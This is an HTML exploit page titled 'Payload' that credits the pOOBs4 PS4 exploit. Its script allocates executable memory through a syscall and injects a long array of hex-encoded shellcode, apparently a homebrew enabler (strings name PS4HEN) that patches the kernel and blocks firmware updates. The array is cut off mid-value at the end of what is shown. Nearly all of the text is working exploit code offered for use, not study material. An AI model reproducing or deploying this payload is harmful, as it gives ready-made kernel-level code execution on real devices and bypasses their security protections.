<!DOCTYPE html><html>
<head>
	<script>
if (window.applicationCache.status === 0) {
  window.location.replace("cache.html");
}
</script>
<title>Payload</title>
<meta name=viewport content="width=device-width, initial-scale=1">
<style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
<script>

// original exploit: https://github.com/ChendoChap/pOOBs4

function showMessage(msg) {
  document.getElementById("message").innerHTML = msg;
  document.getElementById("message").style.display='block';
}

function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
{
	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
	var payload=[0X0004ebe9,0X1e0ff300,0X8d4853fa,0X000caf1d,0Xdf894800,0X0006bfe8,0Xdf894800,0X0006dbe8,0X0309be00,0X89480000,0X1d8d48df,0X00000ca6,0X0006bbe8,0Xdf894800,0X00069be8,0Xdf894800,0X0006b7e8,0Xdf894800,0X000309be,0X1d8d4800,0X00000ca1,0X000697e8,0X0000be00,0X89480008,0X067ee8df,0Xc0850000,0X89480b79,0Xf6315bdf,0X00066fe9,0Xf3c35b00,0X48fa1e0f,0X8308568b,0X8166ffc8,0X0f03843a,0X0000bf85,0X0082b900,0X320fc000,0X20e2c148,0X48c20948,0Xfe40828d,0X200fffff,0Xd18948c2,0Xffe18148,0X0ffffeff,0Xc931c122,0Xf780c766,0Xeb002716,0X80c76600,0X00271703,0Xc76601eb,0X27160280,0X6600eb00,0X160e80c7,0X01eb0027,0Xa380c766,0Xeb00271b,0X80c76600,0X00271baf,0Xc76601eb,0X271be080,0Xc700eb00,0X0046bc80,0Xc0314800,0Xc080c6eb,0X00000046,0Xc080c766,0X31006885,0Xc280c6c0,0Xc3006885,0X3080c766,0Xb0006504,0X3280c601,0Xc3006504,0X6080c766,0Xb0006504,0X6280c601,0Xc3006504,0X8e488889,0X8889004e,0X004ea12f,0Xb70680c6,0X0f40003a,0Xc031c222,0X8ac031c3,0X0c88070c,0Xc0ff4806,0X75c23948,0X0ff3c3f2,0X8b48fa1e,0Xc8830856,0X3a8166ff,0X850f0384,0X000000e1,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48c209,0Xfffe4082,0Xc2200fff,0X48d18948,0Xffffe181,0X220ffffe,0X31c931c1,0X0580c6f6,0Xc7002717,0X161080c6,0Xc6c60027,0X271bb180,0Xc766ce00,0X62687480,0Xc600eb00,0X000acd80,0X80c6eb00,0X002713fd,0X4180c6eb,0Xeb002714,0X14bd80c6,0Xc6eb0027,0X27150180,0X80c6eb00,0X002716ad,0X5d80c6eb,0Xeb00271b,0X1c2d80c6,0X66eb0027,0X715f80c7,0X00eb0062,0X04908889,0X80c60000,0X000004c2,0X80c766eb,0X000004b9,0Xc76600eb,0X0004b580,0Xc600eb00,0X001a0680,0Xb089eb00,0X00080b8d,0Xc480c766,0X900023ae,0X7f80c6e9,0Xeb0023b6,0X1b4080c7,0X31480022,0X80c6c3c0,0X0016632a,0X2d80c637,0X37001663,0X31c2220f,0X0ff3c3c0,0X8b4cfa1e,0X41660856,0X03843a81,0X01ef850f,0X57410000,0X000082b9,0X415641c0,0X41320f55,0Xe2c14854,0X48535520,0X4838ec83,0X8d48c209,0Xb902f082,0Xd1894901,0X74ba8d48,0X48fffffe,0X1224748d,0X409a8d48,0X4cfffffe,0Xf8d0a28d,0X02ba0012,0X48000000,0X08244489,0Xfffe94e8,0X748d48ff,0X8d491424,0Xfffe76b9,0Xfe83e8ff,0X8d48ffff,0X49162474,0Xfe78b98d,0X72e8ffff,0X45fffffe,0X3145f631,0X5c8d4ced,0Xb70f1824,0X41162444,0X8d0fc639,0X00000080,0X44b70f44,0X08ba1424,0X0f000000,0X122444b7,0X45de894c,0X41c6af0f,0X8d41c001,0X63482878,0Xdf0148ff,0Xfffe30e8,0X788d41ff,0X748d4810,0X63482024,0Xdf0148ff,0Xfffe1ce8,0X788d41ff,0X748d4830,0X63482824,0Xdf0148ff,0Xfffe08e8,0X448b48ff,0X8b481824,0X48282454,0X20244403,0X02848d48,0X821fffff,0X48daf748,0X2148d829,0Xc53949d0,0Xe8420f4c,0Xe9c6ff41,0Xffffff72,0X00c58149,0X487de000,0X840fdb85,0X000000c3,0X0fed854d,0X0000ba84,0X48c03100,0X4803148d,0X002f3a81,0X0d746100,0X4cc0ff48,0Xeb72e839,0X00009ee9,0X428b4800,0Xac8d4d08,0Xdffe4001,0Xed854d7d,0X0089840f,0X8b4d0000,0X8b4d0872,0X200f107a,0Xe88948c5,0Xffff2548,0X220ffffe,0X4cf631c0,0X00baef89,0Xff000040,0X002bb315,0Xfa894c00,0X4cf6894c,0X15ffef89,0X00002b9c,0Xfad783c6,0X48eb0012,0X08247c8b,0X3d948d4b,0X00003fff,0X48ee894c,0Xc000e281,0X8148ffff,0Xffc000e6,0X0007b9ff,0Xff410000,0Xd783c6d4,0X750012fa,0X49c5220f,0X4808468b,0X5b38c483,0X000384bf,0X5c415d00,0X41e8014c,0X415e415d,0X48e0ff5f,0X8338c483,0X5d5bffc8,0X5d415c41,0X5f415e41,0Xffc883c3,0X1e0ff3c3,0Xec8348fa,0Xe8c03118,0X000005f0,0X24748d48,0X3d8d480e,0Xfffffbff,0X24448966,0X02d8e80e,0X83480000,0Xf3c318c4,0X48fa1e0f,0X3128ec83,0X05c6e8c0,0X8d480000,0X48082474,0Xfdb43d8d,0X8966ffff,0X48082444,0X09f2058d,0X89480000,0X48102444,0X182444c7,0X00001ed8,0X000299e8,0Xc4834800,0X0ff3c328,0X8348fa1e,0Xc03118ec,0X000587e8,0X748d4800,0X8d480e24,0Xfffc7d3d,0X448966ff,0X6fe80e24,0X48000002,0Xc318c483,0Xfa1e0ff3,0X55415641,0X53555441,0X30ec8148,0Xe800000c,0X0000026a,0X00033ce8,0X48c03100,0X45e8e389,0X4c000005,0X2d24ac8d,0X4c000004,0X2d24648d,0X03843d66,0Xc0317374,0X00030cb9,0Xdf894800,0X000026ba,0Xc6abf300,0X012c2444,0Xb9358d48,0Xc7000028,0Xff102444,0X4cffffff,0X15ffef89,0X00002a38,0X8d48c031,0X00079c15,0X0400be00,0X894c0000,0X1915ffe7,0X8500002a,0Xff107ec0,0X809848c8,0X0a2d047c,0X44c60575,0X31002d04,0X0c30bac9,0X89480000,0Xffff31de,0X0029c315,0Xffc88300,0X000107e9,0X4cc03100,0X076d358d,0X44e80000,0X4c000006,0X61e8f789,0X85000001,0X74c589c0,0X48c03147,0X0cb9df89,0Xba000003,0X00000026,0X44c6abf3,0X4c012c24,0X44c7ef89,0Xffff1024,0X8d48ffff,0X0027df35,0Xa915ff00,0X48000029,0X073e158d,0X00be0000,0X4c000004,0Xc031e789,0X298a15ff,0X7ceb0000,0Xe8f7894c,0X0000012f,0X4ee8c031,0X31fffffe,0Xfeb0e8c0,0Xc031ffff,0X000609e8,0Xf9e3e800,0Xc031ffff,0X000627e8,0Xe8c03100,0Xfffffe57,0X0cb9e889,0X48000003,0X26badf89,0Xf3000000,0X2444c6ab,0X8d48012c,0X00273335,0X2444c700,0Xffffff10,0Xef894cff,0X293215ff,0X8d480000,0X0006e10d,0X158d4800,0X000006e0,0X000400be,0Xe7894c00,0X15ffc031,0X0000290c,0X107ec085,0X9848c8ff,0X2d047c80,0Xc605750a,0X002d0444,0X30bac931,0X4800000c,0Xff31de89,0X28b615ff,0Xc0310000,0X30c48148,0X5b00000c,0X415c415d,0Xc35e415d,0X03c0c748,0Xe9000000,0X000005bd,0X05c0c748,0Xe9000000,0X000005b1,0X06c0c748,0Xe9000000,0X000005a5,0X0ac0c748,0Xe9000000,0X00000599,0X16c0c748,0Xe9000000,0X0000058d,0X88c0c748,0Xe9000000,0X00000581,0X89c0c748,0Xe9000000,0X00000575,0Xdec0c748,0Xe9000001,0X00000569,0Xfa1e0ff3,0Xf631d231,0Xff9ee851,0Xc789ffff,0Xff83c031,0Xe80a74ff,0Xffffff9c,0X000001b8,0Xf3c35a00,0Xbafa1e0f,0X000001ff,0X000601be,0X75e85100,0X83ffffff,0X0874fff8,0Xe9c7895a,0Xffffff74,0Xc748c358,0X00000bc0,0X0517e900,0Xc7480000,0X000249c0,0X050be900,0X0ff30000,0X4853fa1e,0X27fa1d8d,0X3b830000,0Xc0850f00,0X48000000,0X27e2058d,0Xd2310000,0X48de8948,0X05cc3d8d,0X89480000,0X0139e810,0Xc0850000,0X89482274,0X3d8d48de,0X000005c5,0X000126e8,0X74c08500,0Xde89480f,0Xc53d8d48,0Xe8000005,0X00000113,0X8d483b8b,0X0005ca35,0X158d4800,0X00002798,0X0000f2e8,0X483b8b00,0X05bd358d,0X8d480000,0X00277b15,0X00dde800,0X3b8b0000,0Xc1358d48,0X48000005,0X275e158d,0Xc8e80000,0X8b000000,0X358d483b,0X000005b3,0X41158d48,0Xe8000027,0X000000b3,0X8d483b8b,0X0005bf35,0X158d4800,0X00002724,0X00009ee8,0X483b8b00,0X05ca358d,0X8d480000,0X00270715,0X88e95b00,0X5b000000,0X1e0ff3c3,0X8d4853fa,0X00274b1d,0X003b8300,0X8d487375,0X00270705,0Xc9314500,0X31c03145,0X31d231c9,0X3d8d48f6,0X000005ac,0X8d4810ff,0X00271b15,0X358d4800,0X000005b4,0X0389c789,0X000042e8,0X483b8b00,0X05a9358d,0X8d480000,0X0026f315,0X002de800,0X3b8b0000,0X9b358d48,0X48000005,0X26d6158d,0X18e80000,0X8b000000,0X358d483b,0X00000591,0Xb9158d48,0X5b000026,0X000002e9,0X48c35b00,0X024fc0c7,0Xa2e90000,0Xf3000003,0X48fa1e0f,0Xd231f189,0X45fe8948,0Xbf50c031,0X00000252,0X83e8c031,0X5a000003,0X1e0ff3c3,0Xf28948fa,0X08478b48,0X08528b48,0X48408b4c,0X40708b48,0X66ffc883,0X03843a81,0X82b96e75,0X45c00000,0X320fc931,0X20e2c148,0X0948c931,0X144e89c2,0X40828d48,0X31fffffe,0X568948d2,0X968b4804,0X00000118,0X0013b948,0X00000000,0X89443801,0X908b480a,0X0111f870,0X30568948,0X20808b48,0X49021eff,0X49204089,0X48184089,0X0130878b,0Xc7480000,0Xffff6040,0X8948ffff,0Xc7485848,0Xffff6840,0Xc031ffff,0X1e0ff3c3,0X568b48fa,0Xffc88308,0X843a8166,0Xb95a7503,0Xc0000082,0Xc148320f,0X094820e2,0X828d48c2,0Xfffffe40,0X48c2200f,0X8148d189,0Xfeffffe1,0Xc1220fff,0Xbc9080c7,0X01b80008,0Xc7660000,0X08bc9480,0Xc7c30000,0X08bcb080,0X0001b800,0X80c76600,0X0008bcb4,0X80c7c300,0X00168051,0X01ebc031,0X31c2220f,0X0ff3c3c0,0X8b48fa1e,0Xc8830856,0X3a8166ff,0X2c750384,0X000082b9,0X0f320fc0,0X8948c120,0Xe68148ce,0Xfffeffff,0X48c6220f,0X4820e2c1,0Xc766c209,0X05f66482,0X0f00eb00,0Xc031c122,0X1e0ff3c3,0X8d4851fa,0X00251f15,0Xffc03100,0X31c28912,0X75d285c0,0Xfd14e80d,0Xc085ffff,0X0fc0940f,0Xc35ac0b6,0Xfa1e0ff3,0X54415541,0X81485355,0X0000d8ec,0X2d8d4800,0X00002530,0X00458b66,0X0fc08566,0X00016085,0X258d4c00,0X00002500,0X245c8d48,0X158d482f,0X000024bc,0X242c8b4d,0X894812ff,0X158d48df,0X000003b2,0Xbec18948,0X00000021,0Xff41c031,0X31d231d5,0Xdf8948f6,0Xfffc03e8,0X89c085ff,0X311e79c3,0X48f631d2,0X03a13d8d,0Xede80000,0X85fffffb,0X79c389c0,0Xffc88308,0X000100e9,0X31d23100,0Xe8df89f6,0Xfffffc1c,0X24748d48,0X0020ba08,0Xdf890000,0Xfffbb7e8,0Xf88348ff,0X44d67520,0X246cb70f,0X89d23120,0Xc5ff49df,0X05e5c149,0Xe8ee894c,0Xfffffbec,0X24748d48,0X0040ba50,0Xdf890000,0Xfffb87e8,0Xf88348ff,0X0fa67540,0X862484b7,0X0f000000,0X8824b4b7,0X0f000000,0Xb70ff0af,0X00842484,0X63480000,0Xee014cf6,0Xf7c60148,0X00000fc6,0X48057400,0Xf3ebc6ff,0Xdf89d231,0Xfffb9be8,0Xb48d48ff,0X00009024,0X0040ba00,0Xdf890000,0Xfffb33e8,0Xf88348ff,0X4e850f40,0X89ffffff,0X5c8d48df,0X35e80324,0X48fffffb,0Xa8248c8b,0X31000000,0X244489c0,0X2444c603,0X8d480007,0X0002db15,0X0005be00,0X89480000,0Xc88949df,0X28e9c148,0X20e8c149,0X45c9b60f,0X31c0b60f,0X14ff41c0,0X058d4824,0X000023a8,0Xffdf8948,0X45896610,0Xc4814800,0X000000d8,0X5c415d5b,0Xf3c35d41,0X48fa1e0f,0X3118ec83,0Xfe37e8c0,0Xc289ffff,0Xd285c031,0X51e81b75,0X48fffffe,0Xfce73d8d,0X8d48ffff,0X660e2474,0X0e244489,0Xfffb39e8,0Xc48348ff,0X0ff3c318,0X8348fa1e,0Xc03118ec,0Xfffe27e8,0X3d8d48ff,0Xfffffd4d,0X24748d48,0X4489660e,0X0fe80e24,0X48fffffb,0Xc318c483,0Xfa1e0ff3,0X18ec8348,0Xfde8c031,0X48fffffd,0Xfd903d8d,0X8d48ffff,0X660e2474,0X0e244489,0Xfffae5e8,0Xc48348ff,0X3148c318,0Xca8949c0,0X0172050f,0X3d8348c3,0X000022e3,0X50187400,0X22da15ff,0X89590000,0Xc0c74808,0Xffffffff,0Xffc2c748,0Xc3ffffff,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6470752f,0X2f657461,0X55345350,0X54414450,0X55502e45,0X752f0050,0X74616470,0X53502f65,0X44505534,0X2e455441,0X2e505550,0X2e74656e,0X706d6574,0X70752f00,0X65746164,0X736e5500,0X6f707075,0X64657472,0X72696620,0X7261776d,0X2f002165,0X72657375,0X6d65742f,0X73702f70,0X6e656834,0X616f6c2e,0X00646564,0X48345350,0X69204e45,0X6c612073,0X64616572,0X6f6c2079,0X64656461,0X2e320021,0X00302e32,0X636c6557,0X20656d6f,0X50206f74,0X45483453,0X694c204e,0X25206574,0X696c0073,0X72656b62,0X2e6c656e,0X78727073,0X62696c00,0X6e72656b,0X775f6c65,0X732e6265,0X00787270,0X6b62696c,0X656e7265,0X79735f6c,0X70732e73,0X5f007872,0X7272655f,0X7300726f,0X654b6563,0X6c656e72,0X64616f4c,0X72617453,0X646f4d74,0X00656c75,0X75746567,0X73006469,0X654b6563,0X6c656e72,0X646e6553,0X69746f4e,0X61636966,0X6e6f6974,0X75716552,0X00747365,0X4b656373,0X656e7265,0X7465476c,0X61537346,0X6f62646e,0X6e615278,0X576d6f64,0X0064726f,0X4b656373,0X656e7265,0X7465476c,0X74737953,0X77536d65,0X73726556,0X006e6f69,0X5362696c,0X694c6563,0X6e496362,0X6e726574,0X732e6c61,0X00787270,0X736d656d,0X6d007465,0X70636d65,0X6e730079,0X6e697270,0X735f6674,0X6f746100,0X252f0069,0X6f632f73,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X70732e63,0X2f007872,0X74737973,0X632f6d65,0X6f6d6d6f,0X696c2f6e,0X696c2f62,0X732e6362,0X00787270,0X6c323025,0X32302578,0X0000786c,0X00000000,0X00000000,0X4f414458,0X5041594c,0X00000bd0,0X00000000,0Xc1358b48,0Xff00001f,0X001ffb25,0X41554100,0X51535554,0X9d058b48,0X4900001f,0X8b48fc89,0X058b4818,0X00002010,0X75c08548,0X1b8b480a,0X75db8548,0X8b45ebec,0X000150a8,0Xdd014800,0X8948eb74,0X8d15ffef,0X4c00001f,0X8949e789,0X8115ffc5,0X4900001f,0Xd175c539,0Xc52d8b4c,0X4c00001f,0X15ffe789,0X00001f6c,0X48e6894c,0X8948ef89,0Xd5ff41c2,0Xb175c085,0Xd889485a,0X5c415d5b,0X41c35d41,0X41564157,0X55544155,0Xec834853,0Xce894958,0X0c8b4865,0X00000025,0Xffc88300,0X48ff8548,0X08244c89,0X0085840f,0X89480000,0X7c8d4cd3,0X894d1024,0Xfd8948c4,0Xbaf58949,0X00000010,0X894cf631,0X0d15ffff,0X4c00001f,0X10247489,0X24748d4c,0X5c894820,0X30ba1824,0X31000000,0Xf7894cf6,0X1eee15ff,0X8b480000,0X4808244c,0X000001b8,0X00000100,0X5c894800,0X894c3824,0X4c20247c,0X44c7f689,0X00012824,0X89480000,0X6c894cef,0X89483024,0X48402444,0X48244c89,0X1d9a15ff,0X2b480000,0X4938245c,0X48241c89,0X5b58c483,0X415c415d,0X415e415d,0X5741c35f,0X55415641,0X53555441,0X28ec8348,0X8948c031,0X49182444,0X8948d689,0X15ff2434,0X00001d88,0X74c08548,0Xa08b444c,0X00000100,0X48c38948,0X8545c789,0Xff0b75e4,0X001d6315,0X00e8e900,0X15ff0000,0X00001d50,0X8d48f631,0X48182454,0X15ffdf89,0X00001d30,0X8941c085,0X481a74c5,0X15ffdf89,0X00001d28,0Xffdf8948,0X001d2f15,0Xffc88300,0X0000b3e9,0X358b4800,0X00001e00,0X3afc6b41,0X000002ba,0X3915ff00,0X4d00001e,0X8548fc63,0Xc58948c0,0X74c18948,0Xec3945c2,0X8b48627e,0X48182474,0X08244c89,0X48cf8948,0X4820468b,0X008dc681,0X89480000,0X8b482041,0X89489b46,0X8b482841,0X8948c346,0X568b3041,0X66d089cf,0X2108e8c1,0X0020bad0,0X89660000,0X15ff3841,0X00001db8,0X24448b48,0X4c8b4818,0X8b480824,0X83480840,0X85483ac1,0X448948c0,0X1e751824,0Xffdf8948,0X001c8315,0Xdf894800,0X1c8a15ff,0X8b480000,0X89482404,0X3e894d28,0Xff4108eb,0Xff73e9c5,0Xc031ffff,0X28c48348,0X5c415d5b,0X5e415d41,0Xf3c35f41,0X41fa1e0f,0X41554156,0X31535554,0Xec8348c0,0X3d8d4850,0X00001634,0X24448948,0X44894820,0X8b482824,0X001d8b05,0X908b4800,0X00000100,0X24548948,0X908b4830,0X00000108,0X24548948,0X908b4838,0X00000110,0X18808b48,0X48000001,0X40245489,0X24448948,0Xfd2be848,0X8548ffff,0X830875c0,0Xa1e9ffc8,0X48000002,0X2824548d,0X24748d48,0Xc7894820,0Xe8c38948,0Xfffffe42,0X850fc085,0X00000284,0X244c8b48,0X48d23128,0X2024448b,0X74d13948,0X788366ca,0X8d480538,0X15753a70,0X20688b48,0X4cf63145,0X15a72d8d,0X85480000,0Xeb1375ed,0Xc2ff48aa,0Xebf08948,0Xc6ff49d3,0X08fe8349,0X8b422974,0X4c30b474,0X1824648d,0X4ce0894d,0X04bae989,0X48000000,0X0148df89,0Xfd19e8ee,0Xc085ffff,0X19e9d374,0X48000002,0X1cba058b,0X894d0000,0X0d8d48e0,0X0000155a,0X000002ba,0Xdf894800,0X0120b08b,0X01480000,0Xfce9e8ee,0Xc085ffff,0X01ea850f,0X8b480000,0X001c8b05,0X358d4c00,0X00001531,0X4ce0894d,0X01baf189,0X48000000,0Xb08bdf89,0X00000124,0Xe8ee0148,0Xfffffcb7,0X850fc085,0X000001b8,0X59058b48,0X4d00001c,0X894ce089,0X0001baf1,0X89480000,0X28b08bdf,0X48000001,0X8ce8ee01,0X85fffffc,0X8d850fc0,0X48000001,0X1c2e058b,0X894d0000,0X0d8d48e0,0X000014d3,0X000004ba,0Xdf894800,0X012cb08b,0X01480000,0Xfc5de8ee,0Xc085ffff,0X015e850f,0X8b480000,0X001bff05,0Xe0894d00,0Xa90d8d48,0Xba000014,0X00000005,0X8bdf8948,0X000130b0,0Xee014800,0Xfffc2ee8,0X0fc085ff,0X00012f85,0X058b4800,0X00001bd0,0X48e0894d,0X14760d8d,0X03ba0000,0X48000000,0Xb08bdf89,0X00000134,0Xe8ee0148,0Xfffffbff,0X850fc085,0X00000100,0Xa1058b48,0X4d00001b,0X8d48e089,0X0014d40d,0X0005ba00,0X89480000,0X38b08bdf,0X48000001,0Xd0e8ee01,0X85fffffb,0Xd1850fc0,0X48000000,0X1b72058b,0X894d0000,0X0d8d48e0,0X00001422,0X000004ba,0Xdf894800,0X013cb08b,0X01480000,0Xfba1e8ee,0Xc085ffff,0X00a2850f,0X8b480000,0X001b4305,0Xe0894d00,0X7c0d8d48,0Xba000014,0X00000001,0X8bdf8948,0X000140b0,0Xee014800,0Xfffb72e8,0X75c085ff,0X058b4877,0X00001b18,0X4ce0894d,0X01baf189,0X48000000,0Xb08bdf89,0X00000144,0Xe8ee0148,0Xfffffb4b,0X5075c085,0Xf1058b48,0X4d00001a,0X894ce089,0X0004bae9,0X89480000,0X48b08bdf,0X48000001,0X24e8ee01,0X85fffffb,0X482975c0,0X1aca058b,0X894d0000,0X0d8d48e0,0X0000137f,0X000002ba,0Xdf894800,0X014c808b,0X8d480000,0Xe8000574,0Xfffffaf7,0X247c8b48,0Xff854820,0X44890d74,0X5de80c24,0X8bfffffa,0X480c2444,0X5b50c483,0X415c415d,0Xc35e415d,0Xfa1e0ff3,0X56415741,0X54415541,0X83485355,0Xc03138ec,0X2b3d8d48,0X48000013,0X20244489,0X24448948,0Xfa2fe828,0X8548ffff,0X830875c0,0Xc0e9ffc8,0X48000001,0X2824548d,0X24748d48,0Xc7894820,0Xe8c38948,0Xfffffb46,0X4cff3145,0X12fb358d,0Xc0850000,0X0199850f,0X8b4c0000,0X4c282464,0X20246c8b,0X0fe7394d,0X0000a583,0Xef6b4900,0X000aba3a,0X894c0000,0Xed014cf6,0Xffef8948,0X0019eb15,0X75c08500,0X7d836612,0X0b760438,0X20758b48,0X75f68548,0X4977eb07,0Xbaebc7ff,0X24448d48,0X0d8d4818,0X00001283,0X24448948,0X058b4808,0X000019c8,0X24448b4c,0X0004ba08,0X89480000,0Xf0808bdf,0X48000000,0Xfce8c601,0X85fffff9,0X18850fc0,0X4d000001,0Xed31ee89,0X713d8d4c,0X49000012,0X2674ec39,0X00000cba,0Xfe894c00,0Xfff7894c,0X00197315,0X75c08500,0X8341661b,0X7604387e,0X768b4913,0Xf6854820,0X01b81375,0Xe9000000,0X000000d7,0X49c5ff48,0Xeb3ac683,0X058b48c2,0X00001954,0X920d8d48,0X4c000012,0X0824448b,0X000005ba,0Xdf894800,0X4cf63145,0X121b3d8d,0X808b0000,0X000000f4,0Xe8c60148,0Xfffff977,0X850fc085,0X00000093,0X0ff4394d,0Xfffec284,0X0012baff,0X894c0000,0Xef894cfe,0X18f615ff,0Xc0850000,0X41661675,0X04387d83,0X8b4d0e76,0X854d2065,0Xe90e75e4,0Xfffffe97,0X49c6ff49,0Xeb3ac583,0X058b48c3,0X000018dc,0X202d8d4c,0X4c000012,0X0824448b,0Xbae9894c,0X00000006,0X8bdf8948,0X0000e8b0,0Xe6014c00,0Xfff906e8,0X75c085ff,0X058b4826,0X000018ac,0X4ce9894c,0X0824448b,0X000006ba,0Xdf894800,0X00ec808b,0X8d490000,0Xdce80434,0X48fffff8,0X20247c8b,0X74ff8548,0X2444890d,0Xf842e808,0X448bffff,0X83480824,0X5d5b38c4,0X5d415c41,0X5f415e41,0X1e0ff3c3,0X415541fa,0X48535554,0X3138ec83,0X3d8d48c0,0X00001148,0X24448948,0Xf81be818,0X8548ffff,0Xb80a75c0,0X00000001,0X0000bfe9,0X548d4800,0X8d482024,0X48182474,0X8948c789,0Xf930e8c3,0X3145ffff,0X2d8d4ce4,0X000010e5,0Xd375c085,0X24643b4c,0X6c8b4820,0Xc7731824,0X3ac46b49,0X00000aba,0Xee894c00,0X48c50148,0X15ffef89,0X000017e0,0X1275c085,0X387d8366,0X480b7505,0X48206d8b,0X0775ed85,0Xff4999eb,0X48c1ebc4,0X17ce058b,0X8d4c0000,0X48282444,0X106a0d8d,0X01ba0000,0X48000000,0X894cdf89,0X8b082444,0X0000f8b0,0Xee014800,0Xfff7f6e8,0X75c085ff,0X058b482b,0X0000179c,0X9b0d8d48,0X4c000010,0X0824448b,0X000002ba,0Xdf894800,0X00fc808b,0X8d480000,0Xe8000574,0Xfffff7c7,0X247c8b48,0Xff854818,0X44890d74,0X2de80824,0X8bfffff7,0X48082444,0X5b38c483,0X415c415d,0X0ff3c35d,0Xe850fa1e,0Xfffffcc8,0Xfffee0e8,0X8ce95aff,0Xf3fffff9,0X50fa1e0f,0Xdfe8c031,0X41ffffff,0X20b9415a,0X4500004e,0X8d48c031,0X00102c0d,0X158d4800,0Xffffffc6,0X31358d48,0X31000010,0Xa525ffff,0Xf3000016,0X48fa1e0f,0X1702358b,0X82b90000,0X0fc00000,0Xe2c14832,0Xc2094820,0X89480e8b,0X04568bd0,0X48c82948,0X8948c201,0X00166f15,0X08568b00,0X48c20148,0X165a1589,0X568b0000,0Xc201480c,0X45158948,0X8b000016,0X01481056,0X158948c2,0X00001630,0X4814568b,0X8948c201,0X00161b15,0X18568b00,0X48c20148,0X16061589,0X568b0000,0Xc201481c,0Xf1158948,0X8b000015,0X01482056,0X158948c2,0X000015dc,0X4824568b,0X8948c201,0X0015c715,0X28568b00,0X48c20148,0X15b21589,0X568b0000,0Xc201482c,0X9d158948,0X8b000015,0X01483056,0X158948c2,0X00001640,0X4834568b,0X8948c201,0X00162b15,0X38568b00,0X48c20148,0X16161589,0X568b0000,0Xc201483c,0X01158948,0X8b000016,0X01484056,0X158948c2,0X000015ec,0X4844568b,0X8948c201,0X0015d715,0X48568b00,0X48c20148,0X15c21589,0X568b0000,0Xc201484c,0Xad158948,0X8b000015,0X01485056,0X158948c2,0X00001598,0X4854568b,0X8948c201,0X00158315,0X58568b00,0X48c20148,0X156e1589,0X568b0000,0Xc201485c,0X59158948,0X8b000015,0X01486056,0X158948c2,0X000014ec,0X4864568b,0X8948c201,0X0014d715,0X68568b00,0X48c20148,0X14c21589,0X568b0000,0Xc201486c,0Xad158948,0X8b000014,0X01487056,0X158948c2,0X00001498,0X4874568b,0X8948c201,0X00148315,0X8c968b00,0X48000000,0X8948c201,0X00144315,0X98968b00,0X48000000,0X8948c201,0X00141b15,0X94968b00,0X48000000,0X8948c201,0X00141315,0X90968b00,0X48000000,0X8948c201,0X00140b15,0X9c968b00,0X48000000,0X8948c201,0X0013e315,0X88968b00,0X48000000,0X8948c201,0X0013fb15,0X78568b00,0X48c20148,0X140e1589,0X968b0000,0X00000080,0X48c20148,0X13ee1589,0X968b0000,0X00000084,0X48c20148,0X13d61589,0X568b0000,0Xc201487c,0Xd9158948,0X8b000013,0X0000b496,0Xc2014800,0X59158948,0X8b000013,0X0000a096,0Xc2014800,0X71158948,0X8b000013,0X0000a496,0Xc2014800,0X59158948,0X8b000013,0X0000a896,0Xc2014800,0X41158948,0X8b000013,0X0000ac96,0Xc2014800,0X29158948,0X8b000013,0X0000b096,0Xd0014800,0X11058948,0Xc3000013,0Xfa1e0ff3,0X3d896651,0X00001464,0Xe8ffb70f,0X00000cd9,0X48ffca83,0X8948c085,0X00145705,0X31187400,0Xfd41e8c0,0Xc0e8ffff,0Xe8000004,0X00000bdc,0Xfffcfee8,0X89d231ff,0X48c35ad0,0X3174ff85,0X75023f83,0Xec83482c,0X748d4818,0X15ff0824,0X00001340,0X0474c085,0X10ebc031,0X24448b48,0X78834808,0X940f0108,0Xc0b60fc0,0X18c48348,0Xc3c031c3,0Xfa1e0ff3,0X56415741,0X54415541,0X83485355,0X894828ec,0X7c8d48fb,0X15ff1824,0X000012f8,0X0f013b83,0X0000a985,0X2d8b4c00,0X00001358,0X000002ba,0X358b4800,0X00001354,0X00000cbd,0X3b8b4400,0X08738b44,0X45b70f41,0Xb70f450e,0X01410c65,0Xc46349c4,0X24448948,0Xc7894808,0X137215ff,0X85480000,0X048948c0,0X487e7424,0X4938738b,0X8b48d463,0X15ff243c,0X00001330,0X387b8b48,0X4cd46349,0X15ffee89,0X00001320,0X000203c7,0X89480000,0X638944df,0X6d15ff08,0X48000012,0X48387b8b,0X8924348b,0X548b48c5,0X15ff0824,0X000012f8,0X483b8944,0X12ce358b,0X89440000,0X8b480873,0X15ff243c,0X00001300,0X89481beb,0Xfeede8df,0Xc085ffff,0Xff47850f,0X8948ffff,0X2515ffdf,0X89000012,0Xc48348c5,0X5be88928,0X415c415d,0X415e415d,0X0ff3c35f,0X8548fa1e,0X413e74ff,0X83485554,0X8d4c18ec,0X000c1c25,0X7c894800,0X894c0824,0Xa515ffe6,0X48000012,0X08247c8b,0X48c08548,0X0e74c589,0Xffe7894c,0X00126715,0X7c8d4800,0X83480005,0X415d18c4,0Xed25ff5c,0Xf3000011,0X55fa1e0f,0X41e58948,0Xec834854,0X458b4818,0Xfc894900,0Xf8788b48,0X74ff8548,0X55894819,0X758948e0,0Xfe51e8e8,0X8b48ffff,0Xc085e875,0Xe0558b48,0X83481075,0X894c18c4,0X5d5c41e7,0X119e25ff,0Xc0310000,0X48044289,0X4118c483,0X5dc0315c,0X1e0ff3c3,0X555441fa,0Xfd894853,0Xa0ec8148,0X83000000,0X8949013f,0X480c75cc,0X4374f685,0X75e4854d,0X483ceb32,0X89243489,0Xe80c2454,0Xfffffdf3,0X24348b48,0Xdf75c085,0X0c24548b,0Xa0c48148,0X5b000000,0X48e1894c,0X415def89,0X3125ff5c,0X48000011,0Xc8e8ef89,0X85fffffd,0Xbb0a75c0,0X00000016,0X000117e9,0X748d4800,0X89481024,0X0515ffef,0X85000011,0X0fc389c0,0X0000ff85,0X00458b00,0X7501f883,0X458b480e,0Xc0854838,0Xcfe96b75,0X83000000,0X850f02f8,0X000000cd,0X38458b48,0X0c70b70f,0X1850b70f,0Xe04e8d48,0X05e2c148,0X48d12948,0X0f3ff983,0X0000b386,0X0fe18000,0X00aa850f,0Xb70f0000,0X8d480e48,0Xff000eb4,0X0148ffff,0X448d48c6,0X81482010,0X0000883e,0X48167500,0X4808c683,0X18247